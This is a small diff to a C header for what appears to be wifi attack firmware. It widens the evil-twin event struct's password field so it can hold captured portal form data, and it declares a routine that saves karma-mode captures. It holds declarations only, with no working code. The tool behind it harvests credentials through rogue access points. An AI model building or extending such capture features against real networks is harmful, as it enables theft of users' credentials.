@@ -50,7 +50,7 @@ typedef enum {
 typedef struct {
     evil_twin_event_t event;
     char ssid[33];
-    char password[64];
+    char password[256];  // Increased to hold captured form data
 } evil_twin_event_data_t;
 
 /**
@@ -180,6 +180,12 @@ bool wifi_attacks_is_portal_active(void);
  * @brief Set Karma mode (for internal use - called before starting Evil Twin directly)
  */
 void wifi_attacks_set_karma_mode(bool enable);
+
+/**
+ * @brief Process pending karma data saves
+ * Call this from main loop to avoid SPI conflicts with display
+ */
+void wifi_attacks_process_pending_saves(void);
 
 /**
  * @brief Initialize portal HTML buffer in PSRAM (1MB for large HTML files)
